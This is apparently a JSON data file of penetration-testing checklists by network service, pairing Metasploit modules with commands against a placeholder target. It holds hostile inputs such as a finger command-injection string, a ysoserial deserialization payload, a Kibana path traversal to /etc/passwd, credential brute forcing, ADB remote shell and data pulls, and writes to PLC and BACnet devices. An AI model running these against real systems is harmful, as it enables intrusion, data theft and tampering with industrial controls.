      "msf> auxiliary/scanner/mongodb/mongodb_login - Attempt unauthenticated access",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Look for default credentials",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Enumerate databases and collections",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Test for excessive permissions on data"
    ]
  },
  {
    "id": "aws",
    "testing": [
      "Check for exposed S3 buckets: `aws s3 ls s3://bucketname --no-sign-request`",
      "msf> auxiliary/cloud/aws/enum_ec2 - Test for public EC2 snapshots",
      "msf> auxiliary/scanner/http/git_scanner - Look for exposed keys in public repositories",
      "msf> auxiliary/scanner/aws/aws_enum_iam - Scan for weak IAM policies",
      "msf> auxiliary/scanner/aws/rds_instance_enumeration - Check for public RDS instances",
      "Test API Gateway endpoints"
    ]
  },
  {
    "id": "azure",
    "testing": [
      "Check for public blob storage: `az storage blob list --account-name accountname --container-name containername --auth-mode login`",
      "Test for unauthenticated function apps",
      "Look for excessive permissions in service principals",
      "Scan for misconfigured key vaults",
      "msf> auxiliary/scanner/mssql/mssql_login - Check for public Azure SQL databases",
      "Test Azure AD configuration"
    ]
  },
  {
    "id": "echo",
    "testing": [
      "Connect using netcat: `nc target.com 7`",
      "Send data and verify it echoes back",
      "Check for response data leakage",
      "Attempt to use for network scanning techniques",
      "Test for DoS conditions via repeated connections"
    ]
  },
  {
    "id": "jdwp",
    "testing": [
      "Scan for JDWP ports: `nmap -sT -p- target.com`",
      "msf> exploit/multi/misc/java_jdwp_debugger - Test for unauthenticated access: `jdb -attach target.com:port`",
      "msf> exploit/multi/misc/java_jdwp_debugger - Attempt remote code execution: `jdwp-shellifier.py -t target.com -p port`",
      "msf> exploit/multi/misc/java_jdwp_debugger - Extract sensitive information from memory",
      "msf> exploit/multi/misc/java_jdwp_debugger - Check for exposed debugging interfaces in web applications"
    ]
  },
  {
    "id": "printers",
    "testing": [
      "msf> auxiliary/scanner/printer/printer_version_info - Enumerate printers: `nmap -p 9100,515,631 target.com --script printer-info`",
      "msf> auxiliary/scanner/http/http_login - Test for default credentials",
      "Access printer web interface: `http://target.com:631/`",
      "msf> auxiliary/scanner/printer/printer_list_dir - Attempt to view or modify print queues",
      "msf> auxiliary/scanner/printer/printer_list_dir - Check for sensitive data in stored print jobs",
      "msf> auxiliary/scanner/printer/printer_version_info - Test for printer firmware vulnerabilities"
    ]
  },
  {
    "id": "whois",
    "testing": [
      "msf> auxiliary/gather/whois - Connect to WHOIS server: `nc target.com 43`",
      "msf> auxiliary/gather/whois - Query for domains: enter a domain name",
      "msf> auxiliary/gather/whois - Test for information leakage",
      "msf> auxiliary/gather/whois - Check for rate limiting",
      "msf> auxiliary/gather/whois - Test input validation with special characters"
    ]
  },
  {
    "id": "finger",
    "testing": [
      "msf> auxiliary/scanner/finger/finger_users - Query all users: `finger @target.com`",
      "msf> auxiliary/scanner/finger/finger_users - Query specific user: `finger user@target.com`",
      "msf> auxiliary/scanner/finger/finger_users - Attempt username enumeration",
      "msf> auxiliary/scanner/finger/finger_users - Test for command injection: `finger \"|/bin/ls -la\"@target.com`",
      "msf> auxiliary/scanner/finger/finger_users - Look for leaked system information"
    ]
  },
  {
    "id": "portmapper",
    "testing": [
      "msf> auxiliary/scanner/dcerpc/endpoint_mapper - List RPC services: `rpcinfo -p target.com`",
      "List RPC services: `rpcinfo -s target.com`",
      "msf> auxiliary/scanner/dcerpc/tcp_dcerpc_auditor - Scan for RPC vulnerabilities: `nmap -sV -p 111 --script=rpc* target.com`",
      "msf> auxiliary/scanner/dcerpc/hidden - Check for null sessions and unauthorized access",
      "Test for portmap amplification attack potential"
    ]
  },
  {
    "id": "ident",
    "testing": [
      "msf> auxiliary/scanner/ident/ident_query - Query ident service: `nc target.com 113`",
      "msf> auxiliary/scanner/ident/ident_query - Send port query: `echo \"12345, 80\" | nc target.com 113`",
      "msf> auxiliary/scanner/ident/ident_query - Enumerate users with established connections",
      "msf> auxiliary/scanner/ident/ident_query - Map services to users",
      "msf> auxiliary/scanner/ident/ident_query - Collect OS and service information"
    ]
  },
  {
    "id": "ntp",
    "testing": [
      "msf> auxiliary/scanner/ntp/ntp_peers - Query NTP server: `ntpq -c peers target.com`",
      "msf> auxiliary/scanner/ntp/ntp_monlist - Check for monlist: `ntpdc -n -c monlist target.com`",
      "Test for NTP version: `nmap -sU -p 123 --script ntp-info target.com`",
      "msf> auxiliary/scanner/ntp/ntp_monlist - Check for NTP amplification potential",
      "Test for authentication bypass"
    ]
  },
  {
    "id": "checkpoint",
    "testing": [
      "Identify Check Point services: `nmap -p 264 target.com`",
      "msf> auxiliary/scanner/http/http_version - Test for information disclosure",
      "msf> auxiliary/scanner/http/http_login - Check for management interface access",
      "msf> auxiliary/scanner/http/http_version - Attempt to determine firewall version",
      "msf> auxiliary/scanner/http/http_version - Test for known CVEs based on version"
    ]
  },
  {
    "id": "modbus",
    "testing": [
      "msf> auxiliary/scanner/scada/modbusclient - Discover Modbus devices: `nmap -p 502 target.com`",
      "msf> auxiliary/scanner/scada/modbusclient - Enumerate Modbus IDs: `nmap --script modbus-discover target.com`",
      "msf> auxiliary/scanner/scada/modbusclient - Read coils/registers: `modpoll -m tcp -a [slave ID] -r [register] -c [count] target.com`",
      "msf> auxiliary/scanner/scada/modbusclient - Test for unauthorized write access to coils/registers",
      "msf> auxiliary/scanner/scada/modbusclient - Check for Modbus function code support"
    ]
  },
  {
    "id": "rexec",
    "testing": [
      "msf> auxiliary/scanner/rservices/rexec_login - Connect to rexec: `rexec target.com -l username command`",
      "msf> auxiliary/scanner/rservices/rexec_login - Attempt to execute commands",
      "msf> auxiliary/scanner/rservices/rexec_login - Try unauthenticated or weak credential access",
      "msf> auxiliary/scanner/rservices/rexec_login - Monitor for clear-text credentials",
      "msf> auxiliary/scanner/rservices/rexec_login - Test for command injection"
    ]
  },
  {
    "id": "rlogin",
    "testing": [
      "msf> auxiliary/scanner/rservices/rlogin_login - Connect to rlogin: `rlogin -l username target.com`",
      "msf> auxiliary/scanner/rservices/rlogin_login - Test for trusted hosts: `rlogin target.com`",
      "msf> auxiliary/scanner/rservices/rlogin_login - Check for unauthenticated access",
      "msf> auxiliary/scanner/rservices/rlogin_login - Attempt to bypass authentication",
      "msf> auxiliary/scanner/rservices/rlogin_login - Monitor for clear-text credentials"
    ]
  },
  {
    "id": "rsh",
    "testing": [
      "msf> auxiliary/scanner/rservices/rsh_login - Connect to rsh: `rsh target.com -l username command`",
      "msf> auxiliary/scanner/rservices/rsh_login - Test for trusted hosts",
      "msf> auxiliary/scanner/rservices/rsh_login - Attempt to execute commands without authentication",
      "msf> auxiliary/scanner/rservices/rsh_login - Check for rhosts files",
      "msf> auxiliary/scanner/rservices/rsh_login - Test IP spoofing techniques"
    ]
  },
  {
    "id": "lpd",
    "testing": [
      "Connect to LPD: `nc target.com 515`",
      "msf> auxiliary/scanner/printer/printer_list_dir - List printer queues: `lpq -P printer_name -h target.com`",
      "msf> auxiliary/scanner/printer/printer_list_dir - Submit test print job: `lpr -P printer_name -h target.com file.txt`",
      "msf> auxiliary/scanner/printer/printer_list_dir - Attempt to view other print jobs",
      "msf> auxiliary/scanner/printer/printer_list_dir - Test for command injection through print jobs"
    ]
  },
  {
    "id": "afp",
    "testing": [
      "msf> auxiliary/scanner/afp/afp_login - Connect to AFP: `afpcmd target.com`",
      "msf> auxiliary/scanner/afp/afp_server_info - List AFP shares: `showmount -e target.com`",
      "msf> auxiliary/scanner/afp/afp_login - Attempt anonymous access: `mount_afp afp://target.com/share /mnt/afp`",
      "msf> auxiliary/scanner/afp/afp_login - Brute force credentials: `hydra -L users.txt -P passwords.txt afp://target.com`",
      "msf> auxiliary/scanner/afp/afp_server_info - Check for sensitive data on accessible shares"
    ]
  },
  {
    "id": "ipp",
    "testing": [
      "Access the web interface: `http://target.com:631/`",
      "msf> auxiliary/scanner/printer/printer_list_dir - Enumerate printers: `ipptool -tv target.com:631 get-printers.test`",
      "msf> auxiliary/scanner/http/http_login - Test for default credentials",
      "msf> auxiliary/scanner/http/http_version - Check for information leakage",
      "Test for SSRF via IPP redirection"
    ]
  },
  {
    "id": "rusersd",
    "testing": [
      "Query users: `rusers target.com`",
      "Check detailed user info: `rusers -l target.com`",
      "Enumerate through RPC: `rpcinfo -p target.com | grep rusersd`",
      "Test for information disclosure",
      "Look for system details in responses"
    ]
  },
  {
    "id": "socks",
    "testing": [
      "msf> auxiliary/scanner/socks/socks_login - Test proxy connection: `nc -v target.com 1080`",
      "msf> auxiliary/scanner/socks/socks_proxy_server - Check for open proxy: `proxychains nmap scanme.nmap.org`",
      "msf> auxiliary/scanner/socks/socks_login - Attempt to use proxy without authentication",
      "msf> auxiliary/scanner/socks/socks_proxy_server - Verify proxy filtering rules",
      "msf> auxiliary/scanner/socks/socks_proxy_server - Test for data leakage through proxy"
    ]
  },
  {
    "id": "java_rmi",
    "testing": [
      "msf> auxiliary/scanner/misc/java_rmi_server - Enumerate RMI registry: `nmap -p 1099 --script rmi-dumpregistry target.com`",
      "msf> auxiliary/scanner/misc/java_rmi_server - Check for unauthenticated access",
      "msf> exploit/multi/misc/java_rmi_server - Test for deserialization vulnerabilities: `java -jar ysoserial.jar CommonsCollections1 \"command\" | rmiscout tcp://target.com:1099/`",
      "msf> auxiliary/scanner/misc/java_rmi_server - Attempt to call remote methods without authentication",
      "msf> auxiliary/scanner/misc/java_rmi_server - Look for exposed sensitive methods"
    ]
  },
  {
    "id": "mqtt",
    "testing": [
      "msf> auxiliary/scanner/mqtt/connect - Connect to broker: `mosquitto_sub -h target.com -t \"#\" -v`",
      "msf> auxiliary/scanner/mqtt/connect - Attempt to subscribe to all topics: `mosquitto_sub -h target.com -t \"#\" -v`",
      "msf> auxiliary/scanner/mqtt/connect - Test publishing to topics: `mosquitto_pub -h target.com -t \"test\" -m \"test\"`",
      "msf> auxiliary/scanner/mqtt/connect - Check for authentication",
      "msf> auxiliary/scanner/mqtt/connect - Test TLS implementation"
    ]
  },
  {
    "id": "hp_insight",
    "testing": [
      "msf> auxiliary/scanner/http/hp_imc_login - Access web interface: `https://target.com:2381/`",
      "msf> auxiliary/scanner/http/hp_imc_login - Test default credentials",
      "msf> auxiliary/scanner/http/hp_imc_login - Enumerate version information",
      "msf> auxiliary/scanner/http/hp_imc_login - Check for known vulnerabilities based on version",
      "msf> auxiliary/scanner/http/hp_imc_login - Test for command execution through management features"
    ]
  },
  {
    "id": "squid",
    "testing": [
      "msf> auxiliary/scanner/http/open_proxy - Test proxy access: `curl -x target.com:3128 http://example.com`",
      "msf> auxiliary/scanner/http/open_proxy - Check cache poisoning: `curl -x target.com:3128 -H \"X-Cache-Bypass: true\" http://example.com`",
      "msf> auxiliary/scanner/http/open_proxy - Test for SSRF: `curl -x target.com:3128 http://internal-network/`",
      "msf> auxiliary/scanner/http/open_proxy - Verify access controls",
      "msf> auxiliary/scanner/http/http_version - Check for version information"
    ]
  },
  {
    "id": "iscsi",
    "testing": [
      "msf> auxiliary/scanner/iscsi/iscsi_login - Discover iSCSI targets: `iscsiadm -m discovery -t sendtargets -p target.com`",
      "msf> auxiliary/scanner/iscsi/iscsi_login - Attempt to connect to targets: `iscsiadm -m node -T iqn.target -p target.com --login`",
      "msf> auxiliary/scanner/iscsi/iscsi_login - Test for authentication bypass",
      "msf> auxiliary/scanner/iscsi/iscsi_login - Check for unauthenticated access",
      "msf> auxiliary/scanner/iscsi/iscsi_login - Test for information disclosure in target responses"
    ]
  },
  {
    "id": "saprouter",
    "testing": [
      "msf> auxiliary/scanner/sap/sap_router_info - Test SAPRouter: `saprouter -r -H target.com -S port`",
      "msf> auxiliary/scanner/sap/sap_router_info - Enumerate SAP services: `nmap -p 3299 --script sap-router-info target.com`",
      "msf> auxiliary/scanner/sap/sap_router_portscanner - Check for route permissions",
      "msf> auxiliary/scanner/sap/sap_router_portscanner - Attempt to connect to backend systems",
      "msf> auxiliary/scanner/sap/sap_router_info - Test for information disclosure"
    ]
  },
  {
    "id": "distcc",
    "testing": [
      "msf> auxiliary/scanner/misc/distcc_exec - Scan for distcc: `nmap -p 3632 target.com`",
      "msf> auxiliary/scanner/misc/distcc_exec - Test for RCE: `nmap -p 3632 --script distcc-cve2004-2687 target.com`",
      "msf> auxiliary/scanner/misc/distcc_exec - Attempt to execute commands: `distcc command`",
      "msf> auxiliary/scanner/misc/distcc_exec - Check for authentication mechanisms",
      "msf> auxiliary/scanner/misc/distcc_exec - Test for command injection"
    ]
  },
  {
    "id": "svn",
    "testing": [
      "msf> auxiliary/scanner/http/svn_scanner - List repository: `svn list svn://target.com`",
      "msf> auxiliary/scanner/http/svn_scanner - Check for anonymous access: `svn info svn://target.com`",
      "msf> auxiliary/scanner/http/svn_scanner - Download repository: `svn checkout svn://target.com`",
      "msf> auxiliary/scanner/http/svn_scanner - Test for sensitive information in commit history",
      "msf> auxiliary/scanner/http/svn_scanner - Look for credentials in repository data"
    ]
  },
  {
    "id": "wsd",
    "testing": [
      "Discover services: `nmap -p 3702 --script broadcast-ws-discovery target.com`",
      "Collect endpoint information",
      "Test for amplification DDoS potential",
      "Check for information leakage in responses",
      "Analyze device/service characteristics"
    ]
  },
  {
    "id": "epmd",
    "testing": [
      "msf> auxiliary/scanner/epmd/epmd_info - List Erlang nodes: `epmd -names`",
      "msf> auxiliary/scanner/epmd/epmd_info - Connect to nodes: `erl -name test@attacker.com -setcookie cookie -remsh target@target.com`",
      "msf> auxiliary/scanner/epmd/epmd_info - Enumerate node information",
      "msf> auxiliary/scanner/epmd/epmd_info - Test for cookie authentication bypass",
      "msf> auxiliary/scanner/epmd/epmd_info - Attempt to execute commands on nodes"
    ]
  },
  {
    "id": "cisco_smart_install",
    "testing": [
      "msf> auxiliary/scanner/misc/cisco_smart_install - Check for Smart Install: `nmap -p 4786 -sV target.com`",
      "msf> auxiliary/scanner/misc/cisco_smart_install - Test for configuration access: `cisco-smart-install-client --host target.com --get-config`",
      "msf> auxiliary/scanner/misc/cisco_smart_install - Attempt to modify configuration",
      "msf> auxiliary/scanner/misc/cisco_smart_install - Check for file system access",
      "msf> auxiliary/scanner/misc/cisco_smart_install - Test for code execution vulnerabilities"
    ]
  },
  {
    "id": "docker_registry",
    "testing": [
      "msf> auxiliary/scanner/http/docker_registry_api - List registries: `curl -X GET http://target.com:5000/v2/`",
      "msf> auxiliary/scanner/http/docker_registry_api - Enumerate images: `curl -X GET http://target.com:5000/v2/_catalog`",
      "msf> auxiliary/scanner/http/docker_registry_api - List image tags: `curl -X GET http://target.com:5000/v2/image_name/tags/list`",
      "msf> auxiliary/scanner/http/docker_registry_api - Download image layers to inspect for secrets",
      "msf> auxiliary/scanner/http/docker_registry_api - Test for authentication bypass"
    ]
  },
  {
    "id": "mdns",
    "testing": [
      "msf> auxiliary/scanner/mdns/mdns_query - Discover services: `avahi-browse -a`",
      "msf> auxiliary/scanner/mdns/mdns_query - Query specific service: `avahi-browse -r -t _http._tcp`",
      "msf> auxiliary/scanner/mdns/mdns_query - Test for mDNS amplification potential",
      "msf> auxiliary/scanner/mdns/mdns_query - Attempt service spoofing",
      "msf> auxiliary/scanner/mdns/mdns_query - Collect device information from responses"
    ]
  },
  {
    "id": "redshift",
    "testing": [
      "msf> auxiliary/scanner/postgres/postgres_login - Connect to Redshift: `psql -h target.com -p 5439 -U username -d database`",
      "msf> auxiliary/scanner/postgres/postgres_login - Test for weak credentials",
      "msf> auxiliary/scanner/postgres/postgres_login - Check for public access",
      "msf> auxiliary/scanner/postgres/postgres_login - Enumerate database permissions",
      "msf> auxiliary/scanner/postgres/postgres_login - Look for sensitive data"
    ]
  },
  {
    "id": "adb",
    "testing": [
      "msf> auxiliary/scanner/adb/adb_server_info - Connect to ADB: `adb connect target.com:5555`",
      "msf> auxiliary/scanner/adb/adb_server_info - List devices: `adb devices`",
      "msf> auxiliary/scanner/adb/adb_server_exec - Execute commands: `adb shell \"command\"`",
      "msf> auxiliary/scanner/adb/adb_server_exec - Pull data: `adb pull /data/path/to/file`",
      "msf> auxiliary/scanner/adb/adb_server_exec - Install applications: `adb install app.apk`"
    ]
  },
  {
    "id": "kibana",
    "testing": [
      "msf> auxiliary/scanner/http/kibana_login - Access Kibana interface: `http://target.com:5601/`",
      "msf> auxiliary/scanner/http/kibana_login - Check for unauthenticated access",
      "Test for LFI: `http://target.com:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../etc/passwd`",
      "msf> auxiliary/scanner/elasticsearch/indices_enum - Enumerate Elasticsearch indices",
      "msf> auxiliary/scanner/http/kibana_login - Check for outdated versions with known vulnerabilities"
    ]
  },
  {
    "id": "amqp",
    "testing": [
      "msf> auxiliary/scanner/amqp/amqp_login - Connect to AMQP: `amqp-client target.com 5672`",
      "msf> auxiliary/scanner/amqp/amqp_login - Test for default credentials",
      "msf> auxiliary/scanner/amqp/amqp_login - Enumerate exchanges and queues",
      "msf> auxiliary/scanner/amqp/amqp_login - Attempt to publish/consume messages",
      "msf> auxiliary/scanner/amqp/amqp_login - Check for TLS implementation"
    ]
  },
  {
    "id": "ajp",
    "testing": [
      "msf> auxiliary/scanner/http/tomcat_ghostcat - Scan for AJP: `nmap -p 8009 --script ajp-methods target.com`",
      "msf> auxiliary/scanner/http/tomcat_ghostcat - Test for Ghostcat vulnerability: `ajpShooter.py http://target.com:8080/ 8009 /WEB-INF/web.xml read`",
      "msf> auxiliary/scanner/http/tomcat_ghostcat - Check for information disclosure",
      "msf> auxiliary/scanner/http/tomcat_ghostcat - Attempt to read sensitive files",
      "msf> auxiliary/scanner/http/tomcat_ghostcat - Test for request forgery"
    ]
  },
  {
    "id": "influxdb",
    "testing": [
      "msf> auxiliary/scanner/http/influxdb_enum - Connect to InfluxDB: `curl -G http://target.com:8086/query --data-urlencode \"q=SHOW DATABASES\"`",
      "msf> auxiliary/scanner/http/influxdb_enum - Test for default credentials",
      "msf> auxiliary/scanner/http/influxdb_enum - Check authentication: `curl -G http://target.com:8086/query -u admin:admin --data-urlencode \"q=SHOW DATABASES\"`",
      "msf> auxiliary/scanner/http/influxdb_enum - Test for JWT token vulnerabilities",
      "msf> auxiliary/scanner/http/influxdb_enum - Enumerate users and databases"
    ]
  },
  {
    "id": "splunkd",
    "testing": [
      "Access Splunkd: `curl -k https://target.com:8089/services`",
      "msf> auxiliary/scanner/http/splunk_web_login - Test default credentials: `curl -k -u admin:changeme https://target.com:8089/services`",
      "msf> exploit/multi/http/splunk_upload_app_exec - Enumerate Splunk apps: `curl -k -u username:password https://target.com:8089/services/apps/local`",
      "msf> exploit/multi/http/splunk_upload_app_exec - Test for RCE through apps",
      "msf> auxiliary/gather/splunk_raw_server_info - Check for information disclosure"
    ]
  },
  {
    "id": "bitcoin",
    "testing": [
      "Connect to Bitcoin node: `bitcoin-cli -rpcconnect=target.com getnetworkinfo`",
      "Enumerate peers: `bitcoin-cli -rpcconnect=target.com getpeerinfo`",
      "Test RPC access: `curl --data-binary '{\"jsonrpc\":\"1.0\",\"method\":\"getnetworkinfo\",\"params\":[]},' http://user:pass@target.com:8333`",
      "Check for unauthenticated access",
      "Test for information disclosure"
    ]
  },
  {
    "id": "fastcgi",
    "testing": [
      "Scan for FastCGI: `nmap -p 9000 target.com`",
      "msf> exploit/multi/http/php_fpm_rce - Test for PHP-FPM RCE: `cgi-fcgi -connect target.com:9000 -query /etc/passwd`",
      "Check for path traversal vulnerabilities",
      "msf> exploit/multi/http/php_fpm_rce - Attempt to execute PHP code",
      "Test for information disclosure"
    ]
  },
  {
    "id": "hsqldb",
    "testing": [
      "Connect to HSQLDB: `java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing`",
      "Test for default credentials",
      "Check for unauthenticated access",
      "Attempt SQL injection",
      "Test for remote code execution via stored procedures"
    ]
  },
  {
    "id": "raw_printing",
    "testing": [
      "Connect to printer: `nc target.com 9100`",
      "Send test page: `echo \"Hello World\" | nc target.com 9100`",
      "Extract printer information: `pret target.com raw info`",
      "Test for command injection: `pret target.com raw cmd \"id\"`",
      "Attempt to access file system: `pret target.com raw fs ls`"
    ]
  },
  {
    "id": "ndmp",
    "testing": [
      "Scan for NDMP: `nmap -p 10000 target.com`",
      "Test authentication: `python ndmp_check.py target.com`",
      "Check for default credentials",
      "Attempt to list backup sets",
      "Test for information disclosure"
    ]
  },
  {
    "id": "glusterfs",
    "testing": [
      "Enumerate GlusterFS: `gluster peer status`",
      "List volumes: `gluster volume list`",
      "Check for unauthenticated access",
      "Attempt to mount volumes: `mount -t glusterfs target.com:/volume /mnt/gluster`",
      "Test for RCE vulnerabilities in older versions"
    ]
  },
  {
    "id": "tiller",
    "testing": [
      "Connect to Tiller: `helm --host target.com:44134 ls`",
      "Check authentication: `helm --host target.com:44134 version`",
      "Test for unauthenticated access",
      "Attempt to install malicious charts",
      "Check for information disclosure"
    ]
  },
  {
    "id": "ethernetip",
    "testing": [
      "Scan for EthernetIP: `nmap -p 44818 target.com`",
      "msf> auxiliary/admin/scada/multi_cip_command - Enumerate devices: `nmap --script enip-info target.com`",
      "msf> auxiliary/admin/scada/multi_cip_command - List device attributes: `python cpppo-client.py target.com GetAttributeList`",
      "Test for unauthenticated access to PLCs",
      "msf> auxiliary/admin/scada/multi_cip_command - Attempt to read/write PLC data"
    ]
  },
  {
    "id": "bacnet",
    "testing": [
      "msf> auxiliary/scanner/scada/bacnet_l3 - Scan for BACnet: `nmap -sU -p 47808 target.com`",
      "msf> auxiliary/scanner/scada/bacnet_l3 - Enumerate devices: `bacnet-discover`",
      "Read device properties: `bacnet-read-property target.com device 8 object-name`",
      "Write to devices: `bacnet-write-property target.com device 8 present-value 100`",
      "Test for unauthenticated system control"
    ]
  }
]
